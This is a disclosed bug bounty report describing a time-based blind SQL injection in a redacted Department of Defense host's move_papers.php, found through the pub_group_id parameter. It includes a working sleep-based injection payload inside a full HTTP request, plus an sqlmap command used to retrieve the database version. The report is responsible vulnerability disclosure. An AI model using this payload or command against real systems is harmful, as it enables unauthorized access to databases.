# SQL Injection in the `move_papers.php` on the https://██████████

## Report Details
- **Report ID**: 491191
- **URL**: https://hackerone.com/reports/491191
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-02-05T02:56:28.657Z
- **Disclosed**: 2020-06-25T13:07:27.469Z

## Reporter
- **Username**: sp1d3rs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
##Description
Hello. I was able to find another one Time-based SQLI on the `https://██████████/pubs/move_papers.php` using `pub_group_id` parameter.

This is my third SQLi (and probably the last one) found on this host. I wasn't able to detect more, but due to the big number of high impact issues found I also recommend to do internal audit of this host to determine other potential issues I could skip. I have feeling that more endpoints can be affected by the sql injection, I just didn't find them all. I'll continue my research and will report other vulnerabilities if I find any.

For the start, by bruteforcing files in the /pubs/ directory, I came across this script:
https://████████/pubs/move_papers.php
██████████
I was able to determine the parameter `pub_group_id` (similar sqli through this parameter was found and reported earlier in other script - `get_publications.php` in #489483 )

##POC
```
GET /pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b' HTTP/1.1
Host: █████████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: ███████


```
This request will trigger the 5 sec delay of the response. By making sleep value as 10, request will be delayed for 10 seconds.
As additional POC, that attacker is able to extract data, and it's not a false-positive, I retrieved DB banner (version) only using sqlmap command:
```
sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5
```
where test.txt is a text file contained request dump:
████
Result:
```
5.5.62-0ubuntu0.14.04.1
```
█████
No sensitive data such as databases, tables, or content was accessed.

## Impact

SQL injection usually have high or critical impact.

## Attachments
No attachments
